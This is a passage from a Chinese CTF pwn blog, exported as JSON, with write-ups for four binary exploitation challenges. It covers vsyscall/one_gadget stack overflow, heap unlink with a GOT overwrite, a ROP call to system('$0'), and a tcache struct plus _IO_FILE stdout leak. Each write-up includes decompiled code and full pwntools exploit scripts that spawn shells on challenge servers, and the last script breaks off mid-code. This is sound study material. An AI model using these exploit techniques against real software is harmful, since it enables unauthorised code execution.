[{"title":"1000levevls","url":"/2021/12/01/1000levevls/","content":"检查程序\n开启了pie和nx\n__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123;  int v3; // eax  __int64 v4; // rdx  __int64 v5; // rcx  init_0();  sub_B69();  while ( 1 )  &#123;    while ( 1 )    &#123;      menu();      v3 = sub_B00();      if ( v3 != 2 )        break;      hint(a1, a2, v4, v5);    &#125;    if ( v3 == 3 )      break;    if ( v3 == 1 )    &#123;      go(a1, a2, v4, v5);    &#125;    else    &#123;      a1 = &quot;Wrong input&quot;;      puts(&quot;Wrong input&quot;);    &#125;  &#125;  sub_D92(a1, a2, v4, v5);  return 0LL;&#125;\n\nint hint()&#123;  char v1[264]; // [rsp+8h] [rbp-108h] BYREF  if ( unk_20208C )    sprintf(v1, &quot;Hint: %p\\n&quot;, &amp;system);  else    strcpy(v1, &quot;NO PWN NO FUN&quot;);  return puts(v1);&#125;\n\nint go()&#123;  __int64 v1; // [rsp+0h] [rbp-120h]  int v2; // [rsp+8h] [rbp-118h]  int v3; // [rsp+Ch] [rbp-114h]  __int64 v4; // [rsp+10h] [rbp-110h]  __int64 v5; // [rsp+10h] [rbp-110h]  __int64 v6; // [rsp+18h] [rbp-108h]  char v7[256]; // [rsp+20h] [rbp-100h] BYREF  puts(&quot;How many levels?&quot;);  v1 = sub_B00();  if ( v1 &gt; 0 )    v4 = v1;  else    puts(&quot;Coward&quot;);  puts(&quot;Any more?&quot;);  v5 = v4 + sub_B00();  if ( v5 &gt; 0 )  &#123;    if ( v5 &lt;= 99 )    &#123;      v6 = v5;    &#125;    else    &#123;      puts(&quot;You are being a real man.&quot;);      v6 = 100LL;    &#125;    puts(&quot;Let&#x27;s go!&#x27;&quot;);    v2 = time(0LL);    if ( sub_E43(v6) )    &#123;      v3 = time(0LL);      sprintf(v7, &quot;Great job! You finished %d levels in %d seconds\\n&quot;, v6, (v3 - v2));      puts(v7);    &#125;    else    &#123;      puts(&quot;You failed.&quot;);    &#125;    exit(0);  &#125;  return puts(&quot;Coward Coward Coward Coward Coward&quot;);&#125;\n\n_BOOL8 __fastcall sub_E43(signed int a1)&#123;  __int64 v2; // rax  __int64 buf[4]; // [rsp+10h] [rbp-30h] BYREF  unsigned int v4; // [rsp+34h] [rbp-Ch]  unsigned int v5; // [rsp+38h] [rbp-8h]  unsigned int v6; // [rsp+3Ch] [rbp-4h]  buf[0] = 0LL;  buf[1] = 0LL;  buf[2] = 0LL;  buf[3] = 0LL;  if ( !a1 )    return 1LL;  if ( !sub_E43((a1 - 1)) )    return 0LL;  v6 = rand() % a1;  v5 = rand() % a1;  v4 = v5 * v6;  puts(&quot;====================================================&quot;);  printf(&quot;Level %d\\n&quot;, a1);  printf(&quot;Question: %d * %d = ? Answer:&quot;, v6, v5);  read(0, buf, 0x400uLL);  v2 = strtol(buf, 0LL, 10);  return v2 == v4;&#125;\n\n流程分析可以看到E43存在栈溢出但是因为开启了PIE保护所以我们也不知道要ret什么玩意\nvsyscall现代的Windows/*Unix操作系统都采用了分级保护的方式，内核代码位于R0，用户代码位于R3。许多对硬件和内核等的操作都会被包装成内核函数并提供一个接口给用户层代码调用，这个接口就是我们熟知的int 0x80/syscall+调用号模式。当我们每次调用这个接口时，为了保证数据的隔离，我们需要把当前的上下文(寄存器状态等)保存好，然后切换到内核态运行内核函数，然后将内核函数返回的结果放置到对应的寄存器和内存中，再恢复上下文，切换到用户模式。这一过程需要耗费一定的性能。对于某些系统调用，如gettimeofday来说，由于他们经常被调用，如果每次被调用都要这么来回折腾一遍，开销就会变成一个累赘。因此系统把几个常用的无参内核调用从内核中映射到用户空间中，这就是vsyscall\nvsyscall的固定地址是0xffffffffff600000–0xffffffffff601000即便是在PIE开启的情况下都是不变的，所以可以用来充当ret的作用\n利用分析其实在上面思路就断了，看了wp发现这道题需要看一看汇编代码，先看hint的代码\n.text:0000000000000D06 ; __unwind &#123;.text:0000000000000D06                 push    rbp.text:0000000000000D07                 mov     rbp, rsp.text:0000000000000D0A                 sub     rsp, 110h.text:0000000000000D11                 mov     rax, cs:system_ptr.text:0000000000000D18                 mov     [rbp+var_110], rax.text:0000000000000D1F                 lea     rax, unk_20208C.text:0000000000000D26                 mov     eax, [rax].text:0000000000000D28                 test    eax, eax.text:0000000000000D2A                 jz      short loc_D57.text:0000000000000D2C                 mov     rax, [rbp+var_110].text:0000000000000D33                 lea     rdx, [rbp+var_110].text:0000000000000D3A                 lea     rcx, [rdx+8].text:0000000000000D3E                 mov     rdx, rax.text:0000000000000D41                 lea     rsi, aHintP     ; &quot;Hint: %p\\n&quot;.text:0000000000000D48                 mov     rdi, rcx        ; s.text:0000000000000D4B                 mov     eax, 0.text:0000000000000D50                 call    _sprintf.text:0000000000000D55                 jmp     short loc_D7C.text:0000000000000D57 ; ---------------------------------------------------------------------------.text:0000000000000D57.text:0000000000000D57 loc_D57:                                ; CODE XREF: hint+24↑j.text:0000000000000D57                 lea     rax, [rbp+var_110].text:0000000000000D5E                 add     rax, 8.text:0000000000000D62                 mov     rsi, 4E204E5750204F4Eh.text:0000000000000D6C                 mov     [rax], rsi.text:0000000000000D6F                 mov     dword ptr [rax+8], 5546204Fh.text:0000000000000D76                 mov     word ptr [rax+0Ch], 4Eh ; &#x27;N&#x27;.text:0000000000000D7C.text:0000000000000D7C loc_D7C:                                ; CODE XREF: hint+4F↑j.text:0000000000000D7C                 lea     rax, [rbp+var_110].text:0000000000000D83                 add     rax, 8.text:0000000000000D87                 mov     rdi, rax        ; s.text:0000000000000D8A                 call    _puts.text:0000000000000D8F                 nop.text:0000000000000D90                 leave.text:0000000000000D91                 retn\n\n虽然hint在反汇编里面看起来是先比较unk_20208C这个地址的值，但是看汇编代码可以看到，他是先将system_addr放到[rbp+var_110]的位置\n在go函数里面也有一个很关键的代码\nv1 = sub_B00();if ( v1 &gt; 0 )\tv4 = v1;else    puts(&quot;Coward&quot;);\n\n关键就关键在v4就是rbp+var_110的位置，继续看汇编代码\n.text:0000000000000B94 ; __unwind &#123;.text:0000000000000B94                 push    rbp.text:0000000000000B95                 mov     rbp, rsp.text:0000000000000B98                 sub     rsp, 120h.text:0000000000000B9F                 lea     rdi, aHowManyLevels ; &quot;How many levels?&quot;.text:0000000000000BA6                 call    _puts.text:0000000000000BAB                 call    sub_B00.text:0000000000000BB0                 mov     [rbp+var_120], rax.text:0000000000000BB7                 mov     rax, [rbp+var_120].text:0000000000000BBE                 test    rax, rax.text:0000000000000BC1                 jg      short loc_BD1.text:0000000000000BC3                 lea     rdi, aCoward    ; &quot;Coward&quot;.text:0000000000000BCA                 call    _puts.text:0000000000000BCF                 jmp     short loc_BDF.text:0000000000000BD1 ; ---------------------------------------------------------------------------.text:0000000000000BD1.text:0000000000000BD1 loc_BD1:                                ; CODE XREF: go+2D↑j.text:0000000000000BD1                 mov     rax, [rbp+var_120].text:0000000000000BD8                 mov     [rbp+var_110], rax.text:0000000000000BDF.text:0000000000000BDF loc_BDF:                                ; CODE XREF: go+3B↑j.text:0000000000000BDF                 lea     rdi, aAnyMore   ; &quot;Any more?&quot;.text:0000000000000BE6                 call    _puts.text:0000000000000BEB                 call    sub_B00.text:0000000000000BF0                 mov     [rbp+var_120], rax.text:0000000000000BF7                 mov     rdx, [rbp+var_110].text:0000000000000BFE                 mov     rax, [rbp+var_120].text:0000000000000C05                 add     rax, rdx.text:0000000000000C08                 mov     [rbp+var_110], rax.text:0000000000000C0F                 mov     rax, [rbp+var_110].text:0000000000000C16                 test    rax, rax.text:0000000000000C19                 jg      short loc_C2C.text:0000000000000C1B                 lea     rdi, aCowardCowardCo ; &quot;Coward Coward Coward Coward Coward&quot;.text:0000000000000C22                 call    _puts.text:0000000000000C27                 jmp     locret_D04\n\n可以看到如果我们输入的v5&lt;0的话就会跳转到loc_BDF位置这个时候我们的[rbp+var_110]就变成可控的了。\n为什么可以这么利用可以看到hint和go都是在main下被调用，所以他们的rbp都是一样的\n接着看栈溢出的函数的汇编代码，主要关注它栈的情况\n.text:0000000000000E43 ; __unwind &#123;.text:0000000000000E43                 push    rbp.text:0000000000000E44                 mov     rbp, rsp.text:0000000000000E47                 sub     rsp, 40h.text:0000000000000E4B                 mov     [rbp+var_34], edi.text:0000000000000E4E                 mov     [rbp+buf], 0.text:0000000000000E56                 mov     [rbp+var_28], 0.text:0000000000000E5E                 mov     [rbp+var_20], 0.text:0000000000000E66                 mov     [rbp+var_18], 0.text:0000000000000E6E                 cmp     [rbp+var_34], 0.text:0000000000000E72                 jnz     short loc_E7E.text:0000000000000E74                 mov     eax, 1.text:0000000000000E79                 jmp     locret_F45\n\n可以看到他就是将rbp换到rsp上然后再减去0x40，那么此时我们栈这块的内存情况就是\n\nsystem地址就在rbp下面的第四个位置，在就是我们只要ret三次就可一到system函数\n这就用到了vsyscall的固定地址是0xffffffffff600000即便是在PIE开启的情况下都是不变的，所以可以用来充当ret的作用\n但是我们就算是ret到了system也没啥用因为我没法控制rdi，题目又给了libc所以很容易想到one_gadget\n\n又因为我们再上面说的这个存放system的地方因为add指令是可以控制的，所以利用思路就是计算one_gadget与system的差值(即便是开启了PIE，他们之间的差值不变)然后利用add指令把system的地址换到one_gadget\nexpfrom pwn import *elf = ELF(&#x27;./100levels&#x27;)libc = ELF(&#x27;./libc.so&#x27;)# r = process(&#x27;./100levels&#x27;)r = remote(&#x27;111.200.241.244&#x27;, 51622)context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]one_gadget = 0x4526asystem_addr = libc.symbols[&#x27;system&#x27;]vsyscall_addr = 0xffffffffff600000r.recvuntil(b&#x27;Choice:\\n&#x27;)r.sendline(b&#x27;2&#x27;)r.recvuntil(b&#x27;Choice:\\n&#x27;)r.sendline(b&#x27;1&#x27;)r.recvuntil(b&#x27;How many levels?\\n&#x27;)r.sendline(b&#x27;0&#x27;)r.recvuntil(b&#x27;Any more?\\n&#x27;)r.sendline(bytes(str(one_gadget-system_addr), encoding=&#x27;utf8&#x27;))for i in range(99):    r.recvuntil(b&quot;\\nQuestion: &quot;)    question = r.recvuntil(b&#x27; = ? Answer:&#x27;, drop=True)    print(question)    res = eval(question)    r.sendline(bytes(str(res), encoding=&#x27;utf8&#x27;))payload = b&#x27;a&#x27;*(0x30+0x8)+p64(vsyscall_addr)*3r.recvuntil(b&#x27; = ? Answer:&#x27;)r.send(payload)r.interactive()\n","categories":["pwn-xctf"],"tags":["栈溢出|vsyscall"]},{"title":"4-ReeHY-main","url":"/2021/12/03/4-ReeHY-main/","content":"保护检查\n就开了个NX\nvoid __fastcall main(__int64 a1, char **a2, char **a3)&#123;  sub_400856(a1, a2, a3);  while ( 1 )  &#123;    menu();    switch ( sub_400C55() )    &#123;      case 1u:        create();        break;      case 2u:        delete();        break;      case 3u:        edit();        break;      case 4u:        show();        break;      case 5u:        puts(&quot;bye~bye~ young hacker&quot;);        exit(0);      default:        puts(&quot;Invalid Choice!&quot;);        break;    &#125;  &#125;&#125;\n\nint sub_400856()&#123;  void *buf; // [rsp+8h] [rbp-8h]  setvbuf(stdout, 0LL, 2, 0LL);  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(stderr, 0LL, 2, 0LL);  chunk_size = malloc(0x14uLL);  puts(&quot;Input your name: &quot;);  write(1, &quot;$ &quot;, 2uLL);  buf = malloc(0x20uLL);  read(0, buf, 0x20uLL);  write(1, &quot;Hello &quot;, 6uLL);  return puts(buf);&#125;\n\nint create()&#123;  int result; // eax  char buf[128]; // [rsp+0h] [rbp-90h] BYREF  void *dest; // [rsp+80h] [rbp-10h]  int v3; // [rsp+88h] [rbp-8h]  size_t nbytes; // [rsp+8Ch] [rbp-4h]  result = chunk_id;  if ( chunk_id &lt;= 4 )  &#123;    puts(&quot;Input size&quot;);    result = sub_400C55();    LODWORD(nbytes) = result;    if ( result &lt;= 4096 )    &#123;      puts(&quot;Input cun&quot;);      result = sub_400C55();      v3 = result;      if ( result &lt;= 4 )      &#123;        dest = malloc(nbytes);        puts(&quot;Input content&quot;);        if ( nbytes &gt; 112 )        &#123;          read(0, dest, nbytes);        &#125;        else        &#123;          read(0, buf, nbytes);          memcpy(dest, buf, nbytes);        &#125;        *(chunk_size + 4LL * v3) = nbytes;        *(&amp;chunk + 2 * v3) = dest;        dword_6020E8[4 * v3] = 1;        ++chunk_id;        result = fflush(stdout);      &#125;    &#125;  &#125;  return result;&#125;\n\n__int64 delete()&#123;  __int64 result; // rax  int v1; // [rsp+Ch] [rbp-4h]  puts(&quot;Chose one to dele&quot;);  result = sub_400C55();  v1 = result;  if ( result &lt;= 4 )  &#123;    free(*(&amp;chunk + 2 * result));    dword_6020E8[4 * v1] = 0;    puts(&quot;dele success!&quot;);    result = --chunk_id;  &#125;  return result;&#125;\n\nint edit()&#123;  int result; // eax  int v1; // [rsp+Ch] [rbp-4h]  puts(&quot;Chose one to edit&quot;);  result = sub_400C55();  v1 = result;  if ( result &lt;= 4 )  &#123;    result = dword_6020E8[4 * result];    if ( result == 1 )    &#123;      puts(&quot;Input the content&quot;);      read(0, *(&amp;chunk + 2 * v1), *(4LL * v1 + chunk_size));      result = puts(&quot;Edit success!&quot;);    &#125;  &#125;  return result;&#125;\n\nshow是不输出东西的\n流程分析sub_400856函数:创建一个堆块用来存放其他堆块的大小\ncreate函数:创建一个堆块放在*(&amp;chunk + 2 * v3)里面，不存在堆溢出\ndelete函数:将一个堆块free掉，没有清除指针，但是用于存放堆块是否处于use状态的指变为了0\nedit函数:根据前面在chunk_size这个堆块里面的值来确定写入的大小，看似也没有堆溢出\n漏洞点delete函数在free的时候是没有检验选择的chunk是否越界，所以我们可以free掉储存chunk大小的堆块然后再create的时候修改其内部的值，就可以造成堆溢出，又因为没有开启PIE保护，理所应当想到unlink漏洞。后面就是需要泄漏地址计算便宜量，其实很好理解，我直接把exp贴出来配合payload很好理解的\nexp:\nfrom pwn import *from LibcSearcher import *elf = ELF(&#x27;./4-ReeHY-main&#x27;)libc = ELF(&#x27;./ctflibc.so.6&#x27;)# r = process(&#x27;./4-ReeHY-main&#x27;, env=&#123;&quot;LD_PRELOAD&quot;: &quot;ctflibc.so.6&quot;&#125;)r = remote(&#x27;111.200.241.244&#x27;, 52152)context.log_level = &#x27;debug&#x27;chunk_arr = 0x6020E0free_got = elf.got[&#x27;free&#x27;]puts_plt = elf.plt[&#x27;puts&#x27;]atoi_got = elf.got[&#x27;atoi&#x27;]def create(size, id, content):    r.recvuntil(b&#x27;$ &#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;Input size\\n&#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;Input cun\\n&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;Input content\\n&#x27;)    r.send(content)def delete(id):    r.recvuntil(b&#x27;$ &#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;Chose one to dele&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf-8&#x27;))def edit(id, content):    r.recvuntil(b&#x27;$ &#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;Chose one to edit\\n&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;Input the content\\n&#x27;)    r.send(content)r.recvuntil(b&#x27;$ &#x27;)r.sendline(b&#x27;196082&#x27;)create(0x100, 0, b&#x27;a&#x27;*0x100)create(0x100, 1, b&#x27;b&#x27;*0x100)# gdb.attach(r)# pause()delete(-2)# gdb.attach(r)payload = p32(0x200)+p32(0x100)create(0x14, 2, payload)payload = p64(0)+p64(0x101)+p64(chunk_arr-0x8*3) + \\    p64(chunk_arr-0x8*2)+b&#x27;a&#x27;*(0x100-0x8*4)+p64(0x100)+p64(0x110)edit(0, payload)delete(1)payload = p64(0)*3+p64(free_got)+p64(1) + \\    p64(atoi_got)+p64(1)+p64(atoi_got)+p64(1)edit(0, payload)edit(0, p64(puts_plt))delete(1)atoi_addr = u64(r.recvuntil(b&#x27;\\ndele success!&#x27;, drop=True)                [1:].ljust(8, b&#x27;\\x00&#x27;))print(hex(atoi_addr))libc = LibcSearcher(&#x27;atoi&#x27;, atoi_addr)offset = atoi_addr-libc.dump(&#x27;atoi&#x27;)system_addr = offset+libc.dump(&#x27;system&#x27;)edit(2, p64(system_addr))r.recvuntil(b&#x27;$ &#x27;)r.sendline(b&#x27;/bin/sh\\x00&#x27;)r.interactive()\n\n","categories":["pwn-xctf"],"tags":["unlink"]},{"title":"GFCTF2021复现","url":"/2022/01/11/GFCTF/","content":"深刻感觉到了这场比赛的难度，要是参加了的话我可能第一道题都完成不了。这次只复现了前面两道，因为第三题考得更多的是代码审计能力吧。\nshell题目保护只开了nx，主函数也是很简单的栈溢出。\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char buf[16]; // [rsp+0h] [rbp-10h] BYREF  system(&quot;echo &#x27;zltt lost his shell, can you find it?&#x27;&quot;);  read(0, buf, 0x38uLL);  return 0;&#125;\n\n但是问题是题目没有泄漏函数。所以这里存在一个冷知识\n\nsystem(“$0”)同样可以拿到shell\n\n在ida发现tip函数存在\n\ntext段可以即可拿到shell\nfrom pwn import *elf = ELF(&#x27;./shell&#x27;)# r = process(&#x27;./shell&#x27;)r = remote(b&#x27;1.14.71.254&#x27;, 28087)context.log_level = &#x27;debug&#x27;system = elf.plt[&#x27;system&#x27;]pop_rdi = 0x00000000004005e3shell_addr = 0x400541ret = 0x0000000000400416r.recvuntil(b&quot;\\n&quot;)payload = b&#x27;a&#x27;*(0x10+0x8)+p64(pop_rdi)+p64(shell_addr) + \\    p64(0x0000000000400416)+p64(system)r.sendline(payload)r.sendline(b&#x27;cat flag&#x27;)r.interactive()\n\nlook_face_no_patch所需知识点：tcache struct attack,_IO_FILE leak\n这个题目有点绕，不过先把知识点掌握了就好。\ntcache struct attack我这里主要是我自己总结可能阐述不是特别清楚所以看不懂的话可以看https://xz.aliyun.com/t/6828 这篇文章。\n字面意思也就是攻击tcache结构体。\n在做长安战役的比赛的off by one那道题目时我就在想，为什么我malloc一个chunk的时候要多出来一个0x250大小的chunk呢，现在知道这个chunk就是tcache的结构体。\n和unsortedbin里面存的main_arena不同的是tcache的结构体就直接放在heap段的第一个。\n\n可以看到上面的0x251大小的就是tcache结构体，再执行到free然后观察其内部结构。\n(因为刚刚的0x80不具有演示效果我改了一下)\n\n可以看见在tcache struct中heap_base+0x10–&gt;heap_base+0x50之间是存放的counts，而heap_base+0x50–&gt;heap_base+0x250之间存放的这是tcache_entry指针。\n利用方式首先利用double free\n\n此时chunk的fd指针指向的是他本身，而我们已知的tcache struct是在heap_base的位置所以只需要修改后面三位为010(这里是因为tcache_entry指向的是和malloc返回的指针只想同一个位置也就是heap_addr+0x10)所以我们只需要爆破第四位即可，那我们成功的概率也就是1/16。当我们爆破成功之后我们此时malloc两次chunk我们就可以得到tcache的结构体，将前面的内容全部填充为0xff即可绕过tcache，让后面free的chunk进入unsorted bin。\n_IO_FILE leak在我的这一篇博客提到过_IO_FILE write https://cv196082.gitee.io/2021/12/06/echo-back/ 不了解结构体可以先去看一下。\n当然同上面知识点一样，我也只是对于自己的总结可能阐述不清楚，若仍有困惑之处请看这位大师傅的 https://blog.wjhwjhn.com/archives/95/\n我写的那一篇博客提到过，内存中存在着三个文件指针，分别是stderr，stdout，stdin。\n\n这三个文件指针一般存放在bss段上用于输出输入数据，所指向的内容在libc中，而结构体内部的内容是可以被修改的，所以当我们有任意地址写的权限是就可以修改结构体实现stdout leak。下面就是stdout的内部结构：\n\n我们需要修改的是_flags和_IO_write_base，在这之间的三个指针，我们覆盖_IO_write_base势必会覆盖掉它们，但是这是stdout，而上面这三个主要是输入的时候才会有用，所以直接覆盖成p64(0)即可。\ncopy:解释以上指针的作用\n\n其中_IO_buf_base 和_IO_buf_end 是缓冲区建立函数。_IO_doallocbuf 会在里面建立输入输出缓冲区，并把基地址保存在_IO_buf_base 中，结束地址保存在_IO_buf_end 中。在建立里输入输出缓冲区后，如果缓冲区作为输出缓冲区使用，会将基址址给_IO_write_base，结束地址给_IO_write_end，同时_IO_write_ptr 表示为已经使用的地址。即_IO_write_base 到_IO_write_ptr 之间的空间是已经使用的缓冲区，_IO_write_ptr 到_IO_write_end 之间为剩余的输出缓冲区。\n\n所以根据以上说法的话，我们只需要将_IO_write_base调小即可输入_IO_write_base与_IO_write_ptr之间的内容。\n_flags为什么也要修改？/* Magic number and bits for the _flags field.  The magic number ismostly vestigial, but preserved for compatibility.  It occupies thehigh 16 bits of _flags; the low 16 bits are actual flag bits.  */#define _IO_MAGIC         0xFBAD0000 /* Magic number */#define _IO_MAGIC_MASK    0xFFFF0000#define _IO_USER_BUF          0x0001 /* Don&#x27;t deallocate buffer on close. */#define _IO_UNBUFFERED        0x0002#define _IO_NO_READS          0x0004 /* Reading not allowed.  */#define _IO_NO_WRITES         0x0008 /* Writing not allowed.  */#define _IO_EOF_SEEN          0x0010#define _IO_ERR_SEEN          0x0020#define _IO_DELETE_DONT_CLOSE 0x0040 /* Don&#x27;t call close(_fileno) on close.  */#define _IO_LINKED            0x0080 /* In the list of all open files.  */#define _IO_IN_BACKUP         0x0100#define _IO_LINE_BUF          0x0200#define _IO_TIED_PUT_GET      0x0400 /* Put and get pointer move in unison.  */#define _IO_CURRENTLY_PUTTING 0x0800#define _IO_IS_APPENDING      0x1000#define _IO_IS_FILEBUF        0x2000/* 0x4000  No longer used, reserved for compat.  */#define _IO_USER_LOCK         0x8000\n\n上面是glibc中给出的常量。\n以puts函数输出的真正调用为例，具体调用的顺序是:\n_IO_puts -&gt; _IO_sputn -&gt; _IO_new_file_xsputn -&gt; _IO_overflow -&gt; _IO_new_file_overflow\n其中检查较为重要的是_IO_new_file_overflow函数。\nif (f-&gt;_flags &amp; _IO_NO_WRITES) / SET ERROR /&#123;    f-&gt;_flags |= _IO_ERR_SEEN;    __set_errno (EBADF);    return EOF;&#125;\n\n_IO_NO_WRITES使用于检验是否可以输出数据的，为1表示禁止，为0表示允许。这个_IO_NO_WRITES在stdout当中为0，在stdin当中为1。根据上面的表达式其实可以看出来我们必须满足**(f-&gt;_flags &amp; _IO_NO_WRITES)==0**\n后面检测_IO_CURRENTLY_PUTTING\nif ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)&#123;    /* Allocate a buffer if needed. */    if (f-&gt;_IO_write_base == NULL)    &#123;        _IO_doallocbuf(f);        _IO_setg(f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);    &#125;    /* Otherwise must be currently reading.    If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,    logically slide the buffer forwards one block (by setting the    read pointers to all point at the beginning of the block).  This    makes room for subsequent output.    Otherwise, set the read pointers to _IO_read_end (leaving that    alone, so it can continue to correspond to the external position). */    if (__glibc_unlikely(_IO_in_backup(f)))    &#123;        size_t nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;        _IO_free_backup_area(f);        f-&gt;_IO_read_base -= MIN(nbackup,                                f-&gt;_IO_read_base - f-&gt;_IO_buf_base);        f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;    &#125;    if (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)        f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;    f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;    f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;    f-&gt;_IO_write_end = f-&gt;_IO_buf_end;    f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;    f-&gt;_flags |= _IO_CURRENTLY_PUTTING;    if (f-&gt;_mode &lt;= 0 &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))        f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;&#125;\n\n主要关心的是_IO_CURRENTLY_PUTTING，这个使用来判断是否初始化的，若是没有初始化过则为0，若是初始化过则为1，一般输出过内容之后就变成了1除非它输出任何东西。如果这里没通过那我们的_IO_write_base会被修改那就达不到泄漏的目的，所以我们要满足**(f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING)==1**\n最后一个检测\nif (do_write)&#123;    count = new_do_write (f, s, do_write);    to_do -= count;    if (count &lt; do_write)    return n - to_do;&#125;\n\n这一部分是进入new_do_write (f, s, do_write);函数。\nstatic size_tnew_do_write(FILE *fp, const char *data, size_t to_do)&#123;    size_t count;    if (fp-&gt;_flags &amp; _IO_IS_APPENDING)        /* On a system without a proper O_APPEND implementation,        you would need to sys_seek(0, SEEK_END) here, but is        not needed nor desirable for Unix- or Posix-like systems.        Instead, just indicate that offset (before and after) is        unpredictable. */        fp-&gt;_offset = _IO_pos_BAD;    else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)    &#123;        off64_t new_pos = _IO_SYSSEEK(fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, 1);        if (new_pos == _IO_pos_BAD)            return 0;        fp-&gt;_offset = new_pos;    &#125;    count = _IO_SYSWRITE(fp, data, to_do);    if (fp-&gt;_cur_column &amp;&amp; count)        fp-&gt;_cur_column = _IO_adjust_column(fp-&gt;_cur_column - 1, data, count) + 1;    _IO_setg(fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);    fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;    fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= 0 &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))                             ? fp-&gt;_IO_buf_base                             : fp-&gt;_IO_buf_end);    return count;&#125;\n\n这里需要注意的是这两个这两句\nif (fp-&gt;_flags &amp; _IO_IS_APPENDING)\nelse if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)\n我们这里无论进入那一个语句都是可以执行到下面的，但是一般来说我们都会选择进入第一个因为他内部的代码较少，只有一行。\n所以根据上面的结论来说我的可以计算出_flags的值。\n1.(fp-&gt;_flags &amp; _IO_NO_WRITES) == 02.(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 13.(fp-&gt;_flags &amp; _IO_IS_APPENDING) == 1\n\n计算可得，fp-&gt;_flags = 0xfbad1800, 其中_IO_MAGIC = 0xfdab0000，这是个 Magic Number，是固定的。\n一般的利用方式一般是将chunk释放进unsorted bin当中，是chunk保存main_arena，然后利用partial overwrite爆破出_IO_2_1_stdout_结构体的位置，随后就是根据上面得出来的值得到_IO_2_1_stdout_的地址来获取libc\n解题有了以上的基础我们才可以正式开始看这道题目。\n检查保护\n保护全开，好样的！\n流程分析题目类型是很常规的菜单题，但是没有edit函数和show函数。先看add函数\nunsigned __int64 add()&#123;  int i; // [rsp+8h] [rbp-498h]  int v2; // [rsp+Ch] [rbp-494h]  char s[1160]; // [rsp+10h] [rbp-490h] BYREF  unsigned __int64 v4; // [rsp+498h] [rbp-8h]  v4 = __readfsqword(0x28u);  memset(s, 0, 0x80uLL);  puts(&quot;cont...&quot;);  v2 = read(0, s, 0x78uLL);  if ( v2 &gt; 112 || v2 &lt; 0 )    run();  s[v2] = 10;  ptr = malloc(v2);  for ( i = 0; s[i] != 10; ++i )    *((_BYTE *)ptr + i) = s[i];  puts(&quot;OK&quot;);  return v4 - __readfsqword(0x28u);&#125;\n\n这里我们malloc的chunk的size是由我们输入的内容长度确定的，而下面的for循环，是将数据写进去，当出现b’\\n’时就会结束循环停止写入。\n再看dele函数\nint dele()&#123;  if ( !ptr )    run();  if ( (unsigned int)dele_time &gt; 2 )    run();  free(ptr);  ++dele_time;  return puts(&quot;OK&quot;);&#125;\n\n这个题很怪的一点就是我们只能删除当前创建的chunk并且总共只能删除三次，而且nssctf贴心的告诉了我们题目运行的环境是ubuntu18那libc版本就是2.27那就代表存在tcache，在不知道tcache struct attack的情况就直接想放弃了。\n利用分析\n首先利用double free让我们创建chunk的fd指针只想自身。\n\n可以看到我们利用爆破最后一个字节修改了tcache struct当中记录counts的值，再观察一下bin的情况\n\n后面也是一样的。接着我们释放chunk，此时储存tcache struct的chunk进入unsorted bin。\n\n接着我们创建一个0x50大小的chunk(至于为什么我放到代码当中解释)。\n\n接着开始猜stdout的地址。到这一步，成功的概率只有1/256了所以我就不做过程截图了(因为我自己打本地的时候等了五六分钟，他给我来一句程序运行太多，就没了)所以下面直接给exp了。\nexpfrom pwn import *from LibcSearcher import *elf = ELF(&quot;./look_face_no_patch&quot;)r = process(&#x27;./look_face_no_patch&#x27;)context.log_level = &#x27;debug&#x27;def create(contents):    r.recvuntil(b&#x27;&gt;&gt;&#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;cont...&#x27;)    r.sendline(contents)def delete():    r.recvuntil(b&#x27;&gt;&gt;&#x27;)    r.sendline(b&#x27;2&#x27;)def boom():    create(b&#x27;\\x00&#x27;*0x30)    delete()    delete()    heap = 0x8010    create((p16(heap)+b&#x27;\\n&#x27;).ljust(0x30, b&#x27;\\x00&#x27;))    create(b&quot;\\n&quot;.ljust(0x30, b&#x27;\\x00&#x27;))    create(b&#x27;\\xff&#x27;*0x30)    delete()    create(b&#x27;\\x00&#x27;*0x40)# 放开前面的counts区域，修改后面的tcache_entry指针，并且是tcache_counts为0，为后续做铺垫    stdout = 0x8760    create((p16(stdout)+b&#x27;\\n&#x27;).ljust(0x10, b&#x27;\\x00&#x27;))# 